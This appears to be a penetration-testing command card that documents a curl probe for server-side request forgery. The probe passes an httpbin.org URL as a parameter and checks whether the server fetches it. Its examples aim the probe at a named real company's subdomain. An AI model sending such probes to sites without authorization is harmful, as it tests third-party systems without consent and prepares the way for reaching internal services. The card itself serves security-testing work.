---
data: 'curl "https://target.com/endpoint?url=http://httpbin.org/ip" -v'
tags:
  - ssrf
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 40a5d87d-bb58-4fc9-b263-aa819c50ab17
created_at: '2025-12-14T03:53:38.441Z'
updated_at: '2025-12-14T03:53:38.441Z'
verified: false
validated: true
submitted: true
---
# curl-external-url-test

## Command

```bash
curl "https://target.com/endpoint?url=http://httpbin.org/ip" -v
```

## Description

This command tests for SSRF by sending a request to a target endpoint with an external URL parameter, using httpbin.org to verify if the server fetches and potentially echoes the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | The parameter name for the URL input (e.g., url=) | Yes |
| `http://httpbin.org/ip` | External test URL to confirm fetching | Yes |
| `-v` | Verbose output for headers and response details | No |

## Examples

### Basic Usage

```bash
curl "https://ideas.starbucks.com/endpoint?url=http://httpbin.org/ip" -v
```

### Advanced Usage

```bash
curl -X POST "https://ideas.starbucks.com/submit" -d "url=http://httpbin.org/get" -H "Content-Type: application/x-www-form-urlencoded" -v
```

## Expected Output

If SSRF is present, the response body includes JSON from httpbin.org, such as {"origin": "server-ip"}, indicating the server made the request.

## Related

- [[Related Procedure: Identify-SSRF-Endpoint-on-Web-Application]]
